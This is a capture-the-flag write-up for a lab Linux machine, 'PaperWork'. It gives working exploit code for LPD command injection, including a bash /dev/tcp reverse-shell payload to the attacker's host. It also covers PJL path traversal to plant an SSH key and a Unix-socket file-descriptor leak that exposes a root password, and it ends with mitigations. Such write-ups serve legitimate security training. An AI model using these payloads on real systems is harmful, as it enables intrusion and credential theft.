---
description: 'Difficulty: Easy | OS: Linux | Tags: LPD Protocol | Printer Exploitation'
---

# PaperWork

### Overview

Paperwork is an **easy-difficulty** Linux machine involving **LPD command injection -> PJL filesystem traversal -> SSH as archivist -> Unix socket file descriptor leak -> Root**.

***

### 1. Reconnaissance

```bash
kali@kali:~$ nmap -Pn -p- --min-rate 5000 10.129.45.131
```

**Output:**

```shellscript
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-11 18:40 -0400
Nmap scan report for 10.129.45.131
Host is up (0.69s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1515/tcp open  ifor-protocol
```

```bash
kali@kali:~$ nmap -sV -sC -p22,80,1515 10.129.45.131
```

**Output:**

```shellscript
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
|_http-server-header: nginx/1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
```

Add the vhost:

```bash
kali@kali:~$ echo "10.129.45.131 paperwork.htb" | sudo tee -a /etc/hosts
```

> **Key Finding:** Port `1515` is a custom legacy print service, and the web service redirects to `paperwork.htb`.

***

### 2. Web Enumeration

The web page exposes the intended print workflow:

```
Protocol: Compliance Level: RFC 1179
Target Queue: archive_intake
Internal Processor: paperwork-archive-v1.02
```

Download the internal processor:

```bash
kali@kali:~$ curl -s http://paperwork.htb/download/archive -o archive.zip
kali@kali:~$ unzip archive.zip
```

The archive contains `server.py`. The important vulnerable line is:

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

The `job_name` comes from the LPD control file `J` field.

> **Key Finding:** The LPD job name is placed into a shell command without sanitization.

***

### 3. LPD Command Injection

Create the exploit:

```bash
kali@kali:~$ nano exploit.py
```

```python
#!/usr/bin/env python3
import socket
import sys

TARGET = "paperwork.htb"
PORT = 1515
QUEUE = "archive_intake"

def exploit(payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((TARGET, PORT))

    s.send(b"\x02" + QUEUE.encode() + b"\n")

    job_num = 666
    hostname = "kali"
    cf_name = f"cfA{job_num:03d}{hostname}"

    control = (
        f"H{hostname}\n"
        f"Pkali\n"
        f"J{payload}\n"
        f"l{hostname}\n"
        f"Ntest.txt\n"
    ).encode()

    s.send(b"\x02" + str(len(control)).encode() + b" " + cf_name.encode() + b"\n")
    s.recv(1024)
    s.send(control + b"\x00")
    s.close()

if __name__ == "__main__":
    lhost = sys.argv[1]
    lport = sys.argv[2]
    payload = f"' ;bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' ;'"
    exploit(payload)
```

Start a listener:

```bash
kali@kali:~$ nc -lnvp 4444
```

Run the exploit:

```bash
kali@kali:~$ python3 exploit.py 10.10.14.133 4444
```

**Shell:**

```shellscript
kali@kali:~$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.133] from (UNKNOWN) [10.129.45.167] 52330
bash: cannot set terminal process group (990): Inappropriate ioctl for device
bash: no job control in this shell
lp@paperwork:/opt/LPDServer$
```

> **Key Finding:** Command injection gives a shell as `lp`.

***

### 4. Internal Service Enumeration

From the `lp` shell:

```bash
lp@paperwork:/opt/LPDServer$ ss -ltnp
```

**Output:**

```shellscript
State  Recv-Q Send-Q Local Address:Port Peer Address:Port Process
LISTEN 0      100          0.0.0.0:1515      0.0.0.0:*    users:(("python3",pid=992,fd=3))
LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*
LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*
LISTEN 0      511          0.0.0.0:80        0.0.0.0:*
LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*
```

Find the process behind port `9100`:

```bash
lp@paperwork:/opt/LPDServer$ ps auxww | grep -Ei '9100|printer|archive|jet|paper' | grep -v grep
```

**Output:**

```shellscript
archivist  991  0.0  0.4  28040 17560 ?  Ss  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
root      1496  0.0  0.4  28432 17968 ?  Ss  /usr/bin/python3 /usr/bin/paperwork-daemon
```

> **Key Finding:** A JetDirect-like service is listening on `127.0.0.1:9100` as `archivist`.

***

### 5. Pivot to Archivist

Generate an SSH key on Kali:

```bash
kali@kali:~$ ssh-keygen -t ed25519 -f ~/paperwork_archivist -N ''
kali@kali:~$ cat ~/paperwork_archivist.pub
```

Public key:

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBV4o7F3CsmOg1hMEcqa/tPKYE52mIGg0IrXRI2mY3Ep kali@kali
```

The printer service root is `/home/archivist/printer/`. By writing to `../.ssh/authorized_keys`, the path resolves to `/home/archivist/.ssh/authorized_keys`.

Run this from the `lp` shell:

```bash
lp@paperwork:/opt/LPDServer$ python3 - <<'PY'
import socket

pub = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBV4o7F3CsmOg1hMEcqa/tPKYE52mIGg0IrXRI2mY3Ep kali@kali\n"

payload = (
    b'\x1b%-12345X@PJL\r\n'
    + f'@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE={len(pub)}\r\n'.encode()
    + pub
    + b'\x1b%-12345X\r\n'
)

s = socket.create_connection(("127.0.0.1", 9100), timeout=2)
s.sendall(payload)
s.close()
PY
```

SSH in as `archivist`:

```bash
kali@kali:~$ ssh -i ~/paperwork_archivist -o IdentitiesOnly=yes archivist@10.129.45.167
```

Read the user flag:

```bash
archivist@paperwork:~$ cat user.txt
54383c66edea58740474769f7f842dd0
```

> **Key Finding:** `FSDOWNLOAD` writes files as `archivist`, and the path translation allows `../` traversal outside the printer directory.

***

### 6. JetDirect Source Review

```bash
archivist@paperwork:~$ cat /home/archivist/printer/jetdirect.py
```

Relevant code:

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))

    def write(self, path, data):
        target = self._translate(path)
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as f: f.write(data)
            return "OK"
        except: return "FILEERROR=1"
```

The `FSDOWNLOAD` handler writes the received bytes:

```python
def handle_download(command, client):
    m = re.search(r'NAME\s*=\s*"([^"]+)"\s*SIZE\s*=\s*(\d+)', command, re.I)
    if not m: return "FILEERROR=1"
    path, size = m.group(1), int(m.group(2))
    data = b""
    while len(data) < size:
        chunk = client._client.recv(min(size - len(data), 4096))
        if not chunk: break
        data += chunk
    return fs.write(path, data)
```

> **Key Finding:** The service normalizes paths but never checks that the final path stays inside `/home/archivist/printer/`.

***

### 7. Privilege Escalation Enumeration

Read the root daemon:

```bash
archivist@paperwork:~$ cat /usr/bin/paperwork-daemon
```

Relevant code:

```python
admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
LOG_PATH = "/home/archivist/printer/logs/commands.log"

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    log_fd = os.open(LOG_PATH, os.O_RDONLY)
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
```

The socket is group-accessible:

```python
socket_path = "/run/paperwork/mgmt.sock"
os.chmod(socket_path, 0o660)
os.chown(socket_path, 0, 1000)
```

> **Key Finding:** If `commands.log` contains `FSQUERY`, `FSUPLOAD`, or `FSDOWNLOAD`, the root daemon sends two live file descriptors to the socket client: the log file and `/etc/paperwork/admin_pins.conf`.

***

### 8. Leak Root Password

Trigger the scanner:

```bash
archivist@paperwork:~$ printf 'FSQUERY trigger\n' >> /home/archivist/printer/logs/commands.log
```

Receive and read the passed file descriptors:

```bash
archivist@paperwork:~$ python3 - <<'PY'
import socket, os, array, re

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")

fds = array.array("i")
msg, anc, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(8))
print(msg.decode("latin-1", "replace"))

for level, typ, data in anc:
    if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
        fds.frombytes(data[:len(data) - (len(data) % fds.itemsize)])

for i, fd in enumerate(fds):
    data = os.pread(fd, 4096, 0).decode("latin-1", "replace")
    print(f"\n--- FD {i} ---")
    print(data)
    m = re.search(r"ADMIN_PASSWORD=(.+)", data)
    if m:
        print("\nROOT PASSWORD:", m.group(1).strip())
PY
```

**Output:**

```shellscript
ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.

--- FD 0 ---
<commands.log content>
FSQUERY trigger

--- FD 1 ---
ADMIN_PASSWORD=ApparelMortuaryCedar22

ROOT PASSWORD: ApparelMortuaryCedar22
```

> **Key Finding:** Direct file permissions no longer matter once root passes an already-open file descriptor to our process.

***

### 9. Root Access

```bash
archivist@paperwork:~$ su -
Password: ApparelMortuaryCedar22
```

Read the root flag:

```bash
root@paperwork:~# cat root.txt
342cf689341282160e8357ec49408804
```

***

### Credentials Summary

| User      | Password / Key              | Method                                      |
| --------- | --------------------------- | ------------------------------------------- |
| lp        | Reverse shell               | LPD command injection on port `1515`        |
| archivist | `~/paperwork_archivist` key | PJL `FSDOWNLOAD` path traversal             |
| root      | `ApparelMortuaryCedar22`    | Unix socket FD leak from `paperwork-daemon` |

### Attack Chain Summary

```
LPD Command Injection (Port 1515)
    ↓
Shell as lp user
    ↓
Jetdirect Path Traversal (Port 9100)
    ↓
Write SSH key to /home/archivist/.ssh/authorized_keys
    ↓
SSH as archivist user
    ↓
Unix Socket FD Passing (/run/paperwork/mgmt.sock)
    ↓
Read root's /etc/paperwork/admin_pins.conf
    ↓
Extract root password
    ↓
su - to root
```

***

### Key Vulnerabilities

1. **Command Injection** - LPD job name is embedded into a shell command.
2. **Unsafe Path Translation** - Printer filesystem allows `../` traversal outside its intended root.
3. **Arbitrary File Write as Archivist** - `FSDOWNLOAD` can create directories and write files.
4. **Unsafe FD Passing** - Root daemon sends a privileged open file descriptor to a lower-privileged user.
5. **Sensitive Secret Reuse** - The leaked admin password can be used for `su -`.

***

#### User Flag

Located in: `/home/archivist/user.txt`

Obtained after SSH access as `archivist`.

***

#### Root Flag

Located in: `/root/root.txt`

Obtained after leaking the root password from `/etc/paperwork/admin_pins.conf`.

***

#### Mitigation Recommendations

1. **Avoid `shell=True`** - Use argument arrays for subprocess calls and never place untrusted fields in shell commands.
2. **Sanitize LPD Metadata** - Validate control file fields before processing.
3. **Constrain Filesystem Roots** - After path normalization, enforce that resolved paths stay under the intended root directory.
4. **Harden Internal Services** - Treat localhost-only services as reachable after a foothold.
5. **Authenticate Unix Socket Clients** - Do not trust group membership alone for sensitive management actions.
6. **Do Not Pass Sensitive FDs** - Never send privileged file descriptors to lower-privileged processes unless absolutely required.
7. **Separate Root Secrets** - Do not store reusable root passwords in files opened by long-running daemons.
